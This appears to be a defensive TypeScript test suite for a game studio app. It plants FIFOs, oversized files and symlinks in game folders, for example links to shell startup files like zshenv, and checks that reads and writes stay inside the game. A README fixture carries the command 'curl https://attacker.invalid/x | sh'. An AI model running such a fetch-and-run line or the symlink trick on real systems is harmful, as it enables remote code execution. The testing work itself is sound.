/**
 * Every read of a game's own files while the library is listed is a read of a folder any agent
 * process writes. studio.json is read never through a link, never blocking on a FIFO and never past
 * a cap, so a hostile one reads as absent (with a warning beside where the game plays); the page,
 * the main entry and package.json are read without blocking on a FIFO or a device. Each row plants
 * one hostile entry in a game and lists the library: the listing resolves (under a one-second
 * deadline when the entry is a FIFO, the only entry a read can block on), the game reads exactly as
 * its twin without that file, nothing in the game changes and the bytes of a file outside it appear
 * nowhere. A row with no FIFO runs without a deadline: there it could only measure the machine's
 * load, never a blocked read.
 */
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { closeSync, constants, openSync } from "node:fs";
import { lstat, mkdir, readdir, readFile, readlink, symlink, writeFile } from "node:fs/promises";
import path from "node:path";
import { describe, it } from "node:test";
import { setTimeout as sleep } from "node:timers/promises";
import { promisify } from "node:util";
import { StudioPlatform } from "../../src/shared/boot.ts";
import type { GameProject } from "../../src/shared/game-project.ts";
import { GameWorkspaces } from "../../src/substrate/game-workspace.ts";
import { readGameDestinations } from "../../src/substrate/project-shape.ts";
import { tmpDir } from "../helpers/tmp.ts";

const execFileAsync = promisify(execFile);

/** How long a listing may take before the row calls it blocked. */
const DEADLINE_MS = 1000;
/** Bytes a JSON file outside the game carries, which must never reach the game or the listing. */
const OUTSIDE_TOKEN = "sk-host-only-secret-9c2e";

/** `work`, or a rejection naming `label` once the deadline passes. */
async function within<T>(work: Promise<T>, label: string): Promise<T> {
  let timer: NodeJS.Timeout | undefined;
  const deadline = new Promise<never>((_, reject) => {
    timer = setTimeout(() => reject(new Error(`${label}: still blocked after ${DEADLINE_MS} ms`)), DEADLINE_MS);
  });
  try {
    return await Promise.race([work, deadline]);
  } finally {
    clearTimeout(timer);
  }
}

/** `work` under the deadline when `fifos` could block it; with none it has nothing to block on. */
function blockable<T>(work: Promise<T>, label: string, fifos: readonly string[]): Promise<T> {
  return fifos.length > 0 ? within(work, label) : work;
}

/** How often, and how many times, a blocked listing's FIFOs are given a writer before the row gives up. */
const UNBLOCK_POLL_MS = 20;
const UNBLOCK_POLLS = 250;

/**
 * Give every FIFO in `fifos` a writer and let it go, again and again until `work` settles, so reads
 * blocked on one (before the fix) finish and free their threads and the file's process can exit.
 * Synchronous opens: a blocked pool has no thread left for an async one.
 */
async function unblock(fifos: readonly string[], work: Promise<unknown>): Promise<void> {
  let settled = false;
  void work.then(
    () => (settled = true),
    () => (settled = true),
  );
  for (let poll = 0; poll < UNBLOCK_POLLS && !settled && fifos.length > 0; poll++) {
    for (const fifo of fifos) {
      try {
        closeSync(openSync(fifo, constants.O_WRONLY | constants.O_NONBLOCK));
      } catch {
        /* no reader is waiting */
      }
    }
    await sleep(UNBLOCK_POLL_MS);
  }
}

/** Every entry under `dir`, links and FIFOs not followed: what a listing must leave as it was. */
async function treeFacts(dir: string): Promise<string[]> {
  const listed: string[] = [];
  for (const entry of await readdir(dir, { recursive: true, withFileTypes: true })) {
    const full = path.join(entry.parentPath, entry.name);
    const info = await lstat(full);
    const rel = path.relative(dir, full);
    if (info.isSymbolicLink()) listed.push(`${rel} -> ${await readlink(full)}`);
    else if (info.isFIFO()) listed.push(`${rel} (fifo)`);
    else if (info.isFile())
      listed.push(`${rel} ${info.size} ${(await readFile(full)).toString("base64").slice(0, 64)}`);
    else listed.push(`${rel}/`);
  }
  return listed.sort();
}

/** A browser game of its own: a page loading `src/main.js`, which draws on a 2D canvas. */
const OWN_GAME: Record<string, string> = {
  "index.html": '<!doctype html><canvas></canvas><script type="module" src="src/main.js"></script>\n',
  "src/main.js": 'document.querySelector("canvas").getContext("2d");\n',
  "package.json": '{"name":"own","dependencies":{"three":"0.170.0"}}\n',
};
/** A C++ · raylib game the studio scaffolded. */
const CPP_GAME: Record<string, string> = {
  "CMakeLists.txt": "cmake_minimum_required(VERSION 3.28)\nproject(game CXX C)\ngenex_add_game(SOURCES src/*.cpp)\n",
  "src/main.cpp": '#include "studio.h"\nint main() {\n  studio::install({});\n}\n',
};

async function writeTree(dir: string, files: Record<string, string>): Promise<void> {
  for (const [rel, text] of Object.entries(files)) {
    await mkdir(path.dirname(path.join(dir, rel)), { recursive: true });
    await writeFile(path.join(dir, rel), text);
  }
}

async function mkfifo(at: string): Promise<void> {
  await execFileAsync("mkfifo", [at]);
}

/** One hostile entry: which game it sits in, what it is, and whether it is studio.json (which warns). */
interface Planting {
  name: string;
  game: Record<string, string>;
  file: string;
  warns: boolean;
  plant(at: string, outside: string): Promise<void>;
}

const STUDIO_JSON_PLANTINGS: Array<Omit<Planting, "game" | "file" | "warns">> = [
  { name: "a FIFO with no writer", plant: (at) => mkfifo(at) },
  { name: "a link to a JSON file outside the game", plant: (at, outside) => symlink(outside, at) },
  { name: "a dangling link", plant: (at, outside) => symlink(`${outside}.missing`, at) },
  { name: "a folder", plant: (at) => mkdir(at) },
  {
    name: "a 2 MiB file",
    plant: (at) => writeFile(at, JSON.stringify({ title: "Huge", pad: "x".repeat(2 * 1024 * 1024) })),
  },
];

const PLANTINGS: Planting[] = [
  ...STUDIO_JSON_PLANTINGS.flatMap((planting) => [
    {
      ...planting,
      name: `studio.json as ${planting.name} (browser game)`,
      game: OWN_GAME,
      file: "studio.json",
      warns: true,
    },
    {
      ...planting,
      name: `studio.json as ${planting.name} (C++ game)`,
      game: CPP_GAME,
      file: "studio.json",
      warns: true,
    },
  ]),
  {
    name: "studio.json that is not JSON",
    game: OWN_GAME,
    file: "studio.json",
    warns: false,
    plant: (at) => writeFile(at, "{ not json"),
  },
  { name: "index.html as a FIFO", game: OWN_GAME, file: "index.html", warns: false, plant: (at) => mkfifo(at) },
  { name: "src/main.js as a FIFO", game: OWN_GAME, file: "src/main.js", warns: false, plant: (at) => mkfifo(at) },
  { name: "package.json as a FIFO", game: OWN_GAME, file: "package.json", warns: false, plant: (at) => mkfifo(at) },
];

/** A library holding `hostile` (the game plus the planting) and `twin` (the same game without that file). */
async function library(planting: Planting) {
  const base = await tmpDir("studio-json-reads-");
  const root = path.join(base, "library");
  const outside = path.join(base, "outside", "keys.json");
  await mkdir(path.dirname(outside), { recursive: true });
  await writeFile(outside, JSON.stringify({ title: OUTSIDE_TOKEN, targets: ["windows"], access_token: OUTSIDE_TOKEN }));
  const without = Object.fromEntries(Object.entries(planting.game).filter(([rel]) => rel !== planting.file));
  await writeTree(path.join(root, "hostile"), without);
  await writeTree(path.join(root, "twin"), without);
  await mkdir(path.dirname(path.join(root, "hostile", planting.file)), { recursive: true });
  await planting.plant(path.join(root, "hostile", planting.file), outside);
  const games = new GameWorkspaces({
    root,
    templateDir: path.join(path.resolve(import.meta.dirname, "../.."), "src", "game-template"),
    vendorDir: path.join(base, "vendor"),
    indexFile: path.join(base, "projects.json"),
    userData: path.join(base, "userData"),
    homeDir: base,
    platform: StudioPlatform.Mac,
  });
  return { base, root, outside, games, hostile: path.join(root, "hostile"), twin: path.join(root, "twin") };
}

/** What a listing says about a game, apart from its name and folder. */
const reading = (game: GameProject | undefined) => ({
  shape: game?.shape,
  destinations: game?.destinations,
  built: game?.built,
});

describe("reading a game's own files never blocks, follows a link or reads past a cap", {
  skip: process.platform === "win32" && "POSIX links and FIFOs",
}, () => {
  for (const planting of PLANTINGS) {
    it(`lists a game with ${planting.name} as if the file were absent`, async () => {
      const env = await library(planting);
      const fifos = (await treeFacts(env.hostile))
        .filter((line) => line.endsWith("(fifo)"))
        .map((line) => path.join(env.hostile, line.split(" ")[0] ?? ""));
      let listing: Promise<unknown> = Promise.resolve();
      try {
        const before = await treeFacts(env.hostile);
        const pending = env.games.list();
        listing = pending;
        const listed = await blockable(pending, "games.list()", fifos);
        const hostile = listed.find((game) => game.name === "hostile");
        const twin = listed.find((game) => game.name === "twin");
        assert.ok(hostile && twin, "both games are listed");
        assert.deepEqual(reading(hostile), reading(twin), "the game reads exactly as its twin without the file");
        assert.equal(hostile.title, "hostile", "the title is the folder's");

        const destinations = await blockable(
          readGameDestinations(env.hostile, hostile.shape, StudioPlatform.Mac),
          "destinations",
          fifos,
        );
        const twinDestinations = await readGameDestinations(env.twin, twin.shape, StudioPlatform.Mac);
        assert.deepEqual(destinations.destinations, twinDestinations.destinations);
        assert.equal(
          destinations.warnings.length,
          twinDestinations.warnings.length + (planting.warns ? 1 : 0),
          `a warning says studio.json was ignored: ${JSON.stringify(destinations.warnings)}`,
        );

        assert.deepEqual(await treeFacts(env.hostile), before, "nothing in the game changed");
        assert.ok(!JSON.stringify(listed).includes(OUTSIDE_TOKEN), "the outside file's bytes are not in the listing");
        const index = await readFile(path.join(env.base, "projects.json"), "utf8").catch(() => "");
        assert.ok(!index.includes(OUTSIDE_TOKEN), "nor in the library index");
        assert.ok(!destinations.warnings.join(" ").includes(OUTSIDE_TOKEN), "nor in a warning");
      } finally {
        await unblock(fifos, listing);
      }
    });
  }
});

/**
 * Opening a folder reads what it says about itself: its README becomes part of the notes the studio
 * writes into the game, and its `.gitignore` decides which rules are promised. A README that is a
 * link to a file outside must not carry that file into the game, and a `.gitignore` that is a FIFO
 * must not stall the Open Game sheet.
 */
describe("opening a folder reads its own README and .gitignore safely", {
  skip: process.platform === "win32" && "POSIX links and FIFOs",
}, () => {
  it("a README.md that links outside the folder never reaches the game's notes", async () => {
    const base = await tmpDir("studio-readme-link-");
    const outside = path.join(base, "outside", "secret.md");
    await mkdir(path.dirname(outside), { recursive: true });
    await writeFile(outside, `# Keys\n${OUTSIDE_TOKEN}\n`);
    const dir = path.join(base, "places", "mine");
    await writeTree(dir, OWN_GAME);
    await symlink(outside, path.join(dir, "README.md"));
    const games = new GameWorkspaces({
      root: path.join(base, "library"),
      templateDir: path.join(path.resolve(import.meta.dirname, "../.."), "src", "game-template"),
      vendorDir: path.join(base, "vendor"),
      indexFile: path.join(base, "projects.json"),
      userData: path.join(base, "userData"),
      homeDir: base,
      platform: StudioPlatform.Mac,
    });
    await games.adopt(dir);
    const notes = await readFile(path.join(dir, "NOTES.md"), "utf8");
    assert.ok(!notes.includes(OUTSIDE_TOKEN), "the linked file's bytes are not in NOTES.md");
    assert.equal(await readlink(path.join(dir, "README.md")), outside, "the link is left as it was");
    assert.equal(await readFile(outside, "utf8"), `# Keys\n${OUTSIDE_TOKEN}\n`);
  });

  it("a .gitignore that is a FIFO does not stall the list of what opening the folder writes", async () => {
    const base = await tmpDir("studio-gitignore-fifo-");
    const dir = path.join(base, "places", "mine");
    await writeTree(dir, OWN_GAME);
    const fifo = path.join(dir, ".gitignore");
    await mkfifo(fifo);
    const games = new GameWorkspaces({
      root: path.join(base, "library"),
      templateDir: path.join(path.resolve(import.meta.dirname, "../.."), "src", "game-template"),
      vendorDir: path.join(base, "vendor"),
      indexFile: path.join(base, "projects.json"),
      userData: path.join(base, "userData"),
      homeDir: base,
      platform: StudioPlatform.Mac,
    });
    const pending = games.plannedWrites(dir);
    try {
      const writes = await within(pending, "plannedWrites");
      assert.ok(Array.isArray(writes));
    } finally {
      await unblock([fifo], pending);
    }
  });
});

/**
 * Validation reads the page and every source it loads: a builder's `game.validate` and the Open
 * Game sheet's preflight both run it on a folder an agent writes. A FIFO at the page or a source
 * must read as unreadable, never hold the call (or a file-system thread) until a writer comes.
 */
describe("validating a game never waits on a FIFO in it", {
  skip: process.platform === "win32" && "POSIX FIFOs",
}, () => {
  for (const fifoAt of ["index.html", "src/main.js"]) {
    it(`${fifoAt} as a FIFO: validateAt and the folder preflight resolve within ${DEADLINE_MS} ms`, async () => {
      const base = await tmpDir("studio-validate-fifo-");
      const dir = path.join(base, "places", "mine");
      await writeTree(dir, OWN_GAME);
      const fifo = path.join(dir, fifoAt);
      await execFileAsync("rm", [fifo]);
      await mkfifo(fifo);
      const games = new GameWorkspaces({
        root: path.join(base, "library"),
        templateDir: path.join(path.resolve(import.meta.dirname, "../.."), "src", "game-template"),
        vendorDir: path.join(base, "vendor"),
        indexFile: path.join(base, "projects.json"),
        userData: path.join(base, "userData"),
        homeDir: base,
        platform: StudioPlatform.Mac,
      });
      const before = await treeFacts(dir);
      const validated = games.validateAt(dir);
      const inspected = games.inspect(dir);
      try {
        const validation = await within(validated, "validateAt");
        assert.ok(Array.isArray(validation.problems), "validation answers");
        const inspection = await within(inspected, "inspect");
        assert.ok(inspection.candidates.length > 0, "the folder is still described");
        assert.deepEqual(await treeFacts(dir), before, "nothing in the folder changed");
      } finally {
        await unblock([fifo], Promise.allSettled([validated, inspected]));
      }
    });
  }
});

/** A shell line a hostile README carries: it must never land in a file outside the game. */
const PAYLOAD_LINE = "curl https://attacker.invalid/x | sh";

/**
 * One link planted in a folder before it is opened: what it is called, where it points (inside the
 * outside folder), and whether that target exists beforehand (a dangling link has none).
 */
interface PlantedLink {
  name: string;
  game: Record<string, string>;
  links: Array<{ at: string; to: string; folder?: boolean; text?: string }>;
}

/** A folder with no game of its own yet: only its README, so the template fills it. */
const BARE_FOLDER: Record<string, string> = { "README.md": `# Mine\n${PAYLOAD_LINE}\n` };

const PLANTED_LINKS: PlantedLink[] = [
  {
    name: "NOTES.md and CLAUDE.md as dangling links (a browser game of its own)",
    game: { ...OWN_GAME, "README.md": `# Mine\n${PAYLOAD_LINE}\n` },
    links: [
      { at: "NOTES.md", to: "zshenv" },
      { at: "CLAUDE.md", to: "claude-rules.md" },
    ],
  },
  {
    name: "NOTES.md and CLAUDE.md as dangling links (a C++ · raylib folder)",
    game: { ...CPP_GAME, "README.md": `# Mine\n${PAYLOAD_LINE}\n` },
    links: [
      { at: "NOTES.md", to: "zshenv" },
      { at: "CLAUDE.md", to: "claude-rules.md" },
    ],
  },
  {
    name: "a template file as a dangling link (a browser game of its own)",
    game: OWN_GAME,
    links: [{ at: "src/studio.js", to: "studio.js" }],
  },
  {
    name: "a template folder as a link to an outside folder (a browser game of its own)",
    game: OWN_GAME,
    links: [
      { at: "references", to: "refs", folder: true },
      { at: "assets", to: "art", folder: true },
    ],
  },
  {
    name: "a template folder as a link to an outside folder (a C++ · raylib folder)",
    game: CPP_GAME,
    links: [{ at: "third_party", to: "vendor", folder: true }],
  },
  {
    name: ".gitignore as a link to an outside file (a browser game of its own)",
    game: OWN_GAME,
    links: [{ at: ".gitignore", to: "global-gitignore", text: "*.log\n" }],
  },
  {
    name: ".gitignore as a dangling link (a C++ · raylib folder)",
    game: CPP_GAME,
    links: [{ at: ".gitignore", to: "zprofile" }],
  },
  {
    name: "NOTES.md as a link to an outside file carrying the title placeholder (a folder with no game yet)",
    game: BARE_FOLDER,
    links: [{ at: "NOTES.md", to: "notes.md", text: "# __GAME_TITLE__\n" }],
  },
];

/**
 * Opening a folder writes the studio's pages and the template files it lacks into it. A folder
 * someone downloaded can hold links where those files go: a write through one would create or
 * change a file outside the game (a NOTES.md link to `~/.zshenv` would put the README's lines into
 * a shell startup file, written by the unsandboxed host). Each row plants links, opens the folder
 * and checks that nothing outside it changed, the links are as they were, and the Open Game sheet
 * never promised a write there.
 */
describe("opening a folder never writes through a link planted in it", {
  skip: process.platform === "win32" && "POSIX links",
}, () => {
  for (const row of PLANTED_LINKS) {
    it(`${row.name}: nothing outside changes and the links stay`, async () => {
      const base = await tmpDir("studio-adopt-links-");
      const outside = path.join(base, "outside");
      await mkdir(outside, { recursive: true });
      const dir = path.join(base, "places", "mine");
      await writeTree(dir, row.game);
      for (const planted of row.links) {
        const target = path.join(outside, planted.to);
        if (planted.folder) await mkdir(target);
        if (planted.text !== undefined) await writeFile(target, planted.text);
        await mkdir(path.dirname(path.join(dir, planted.at)), { recursive: true });
        await symlink(target, path.join(dir, planted.at));
      }
      const games = new GameWorkspaces({
        root: path.join(base, "library"),
        templateDir: path.join(path.resolve(import.meta.dirname, "../.."), "src", "game-template"),
        vendorDir: path.join(base, "vendor"),
        indexFile: path.join(base, "projects.json"),
        userData: path.join(base, "userData"),
        homeDir: base,
        platform: StudioPlatform.Mac,
      });
      const before = await treeFacts(outside);
      const promised = await games.plannedWrites(dir);
      await games.adopt(dir);
      assert.deepEqual(await treeFacts(outside), before, "nothing outside the folder was created or changed");
      for (const planted of row.links) {
        assert.equal(await readlink(path.join(dir, planted.at)), path.join(outside, planted.to), planted.at);
        const under = promised.filter((file) => file === planted.at || file.startsWith(`${planted.at}/`));
        assert.deepEqual(under, [], `the sheet promised no write at ${planted.at}`);
      }
    });
  }
});
